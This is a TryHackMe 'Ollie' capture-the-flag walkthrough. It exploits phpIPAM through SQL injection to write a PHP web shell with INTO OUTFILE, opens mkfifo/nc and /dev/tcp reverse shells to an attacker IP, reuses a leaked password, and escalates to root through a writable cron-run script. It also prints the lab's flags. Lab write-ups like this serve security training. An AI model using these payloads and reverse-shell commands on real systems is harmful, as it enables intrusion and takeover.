# TryHackMe Ollie Writeup

## `Nmap` scan

```ruby
nmap -sCV 10.10.110.61
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 12:29 EDT
Nmap scan report for 10.10.69.196
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:d0:7c:06:87:9a:18:2d:70:d0:e6:1e:23:0d:86:d9 (RSA)
|   256 3e:1f:dc:be:34:3d:83:fe:40:68:0a:3c:bf:85:3e:2b (ECDSA)
|_  256 14:b9:a6:3d:49:93:70:3e:ce:d7:53:6c:07:59:11:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Ollie :: login
|_Requested resource was http://10.10.69.196/index.php?page=login
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds                                                      
```

<img width="906" height="420" alt="image" src="https://github.com/user-attachments/assets/7a9522b3-3e84-454f-99db-4bcde14c36bd" />

- **`ssh`**
- **`http`**
- **`1337`**

---

> ## let's use **`nc`** to connect this port `1337`

```
nc 10.10.69.196 1337 
```
 
<img width="1311" height="537" alt="image" src="https://github.com/user-attachments/assets/0c898a8f-08b8-426a-b09b-4553dd3ea207" />

```
admin : OllieUnixMontgomery!
```

<img width="1918" height="693" alt="image" src="https://github.com/user-attachments/assets/babad150-8884-4425-b86c-99d4af1d6ca3" />

<img width="1911" height="736" alt="image" src="https://github.com/user-attachments/assets/c53ffe3b-704f-4a4e-824d-11acdb554336" />

```ruby
searchsploit phpIPAM 
```

<img width="1313" height="252" alt="image" src="https://github.com/user-attachments/assets/3ad0ae23-3f95-477b-b326-d0a6a8506e67" />

## [exploit](https://fluidattacks.com/advisories/mercury)

<img width="1207" height="217" alt="image" src="https://github.com/user-attachments/assets/bc76f7a5-f2ac-475b-bf37-433e3cad825e" />

<img width="1214" height="366" alt="image" src="https://github.com/user-attachments/assets/48a6d7a7-0966-438a-b919-381e2bdcc007" />

```
" union select @@version,2,user(),4 -- -
```

<img width="1352" height="569" alt="image" src="https://github.com/user-attachments/assets/cc4f41ff-a933-44ab-b266-e280c00392ff" />

```ruby
8.0.28-0ubuntu0.20.04.3/phpipam_ollie@localhost (4)
```

> ## Good! Let’s do more manual reconnaissance within the database, let’s see if our user `phpipam_ollie` is able to write a file!

```sql
" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -
```

- **`group_concat(...)`** : Merges multiple rows into one series
- **`user`** : A column in the `mysql.user` table that contains the name of the database account.
- **`0x3a`** : It is the hex representation of the symbol`: (colon)`. We used it as a separator between `user` and `file_priv`. Using Hex is sometimes useful to avoid `encoding or filtering` problems.
- **`file_priv`** : It is a column in `mysql.user` that shows if the user has `FILE` permission (usually `Y` or `N`) or may contain a list of permissions: depending on the version of MySQL. The presence of `FILE` is important because it allows `SELECT ... INTO OUTFILE` operations and writing files to the server.

<img width="833" height="203" alt="image" src="https://github.com/user-attachments/assets/33b05658-ed86-4566-a6d3-75f339b6bc97" />

```ruby
maint:Y,
mysql.infoschema:N,
mysql.session:N,
mysql.sys:N,
ollie_mysql:Y,
phpipam_ollie:Y,  <===== yes
root:Y)
```

> ### Yes! The user is able to write files!!

> ## So to exploit this, we encoded a simple PHP payload to HEX:

```ruby
<?php system($_GET["cmd"]); ?>
```

<img width="886" height="142" alt="image" src="https://github.com/user-attachments/assets/6c7b3652-21ee-4f3d-a55a-0fb5f1f39a5c" />

```
" Union Select 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
```

```
http://10.10.69.196/shell.php/?cmd=whoami
```

<img width="977" height="165" alt="image" src="https://github.com/user-attachments/assets/92113132-a604-4b29-8563-a621c871ad32" />

```
curl http://10.10.69.196/shell.php\?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.47.102%204444%20%3E%2Ftmp%2Ff
```

<img width="1121" height="220" alt="image" src="https://github.com/user-attachments/assets/81ae3960-09e8-48a2-85a3-164a92452f6a" />

---

> ## try to put same password for **`ollie`** user and Boom it work

<img width="987" height="517" alt="image" src="https://github.com/user-attachments/assets/94655c3f-10d8-4f17-9cd5-e9a195a0afb9" />

```
THM{Ollie_boi_is_daH_Cut3st}
```

---

## Getting Root !!

```ruby
./pspy64 -c
```

```ruby
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/10/14 20:02:49 CMD: UID=1000  PID=2908   | ./pspy64 -c 
2025/10/14 20:02:49 CMD: UID=0     PID=2888   | 
2025/10/14 20:02:49 CMD: UID=1000  PID=2875   | bash -i 
2025/10/14 20:02:49 CMD: UID=1000  PID=2871   | bash 
2025/10/14 20:02:49 CMD: UID=1000  PID=2866   | (sd-pam) 
2025/10/14 20:02:49 CMD: UID=1000  PID=2865   | /lib/systemd/systemd --user 
2025/10/14 20:02:49 CMD: UID=0     PID=2862   | su ollie 
2025/10/14 20:02:49 CMD: UID=33    PID=2836   | bash -i 
2025/10/14 20:02:49 CMD: UID=33    PID=2835   | nc 10.8.47.102 4444 
2025/10/14 20:02:49 CMD: UID=33    PID=2834   | sh -i 
[. . . .]
2025/10/14 20:02:49 CMD: UID=0    PID=4253   | /lib/systemd/systemd-udevd
2025/10/14 20:02:49 CMD: UID=0    PID=4252   | /lib/systemd/systemd-udevd
2025/10/14 20:02:49 CMD: UID=0    PID=4251   | /lib/systemd/systemd-udevd
2025/10/14 20:02:49 CMD: UID=0    PID=4250   | /lib/systemd/systemd-udevd
2025/10/14 20:02:49 CMD: UID=0    PID=4259   | /lib/systemd/systemd-udevd
2025/10/14 20:02:49 CMD: UID=0    PID=4261   | /bin/bash /usr/bin/feedme    <------
2025/10/14 20:02:49 CMD: UID=0    PID=4262   | /bin/bash /usr/bin/feedme	<------
[...]

```

<img width="1029" height="126" alt="image" src="https://github.com/user-attachments/assets/3632b02f-51ae-4f91-a287-6abfdb6166af" />

```
#!/bin/bash

# This is weird?
/bin/bash -i >& /dev/tcp/10.8.47.102/9999 0>&1
```

<img width="912" height="107" alt="image" src="https://github.com/user-attachments/assets/362cae45-942c-40d5-99b8-42d2a0213f25" />

## Let’s set up the listener and wait for the connection! 

```
nc -lnvp 9999
```

<img width="1060" height="397" alt="image" src="https://github.com/user-attachments/assets/244da13b-921e-4607-a512-47c6273d0567" />

<img width="946" height="225" alt="image" src="https://github.com/user-attachments/assets/5a257757-21e9-43b5-9a21-60cbe179748e" />

```
THM{Ollie_Luvs_Chicken_Fries}
```

```ruby
THM{Ollie_boi_is_daH_Cut3st}
THM{Ollie_Luvs_Chicken_Fries}
```

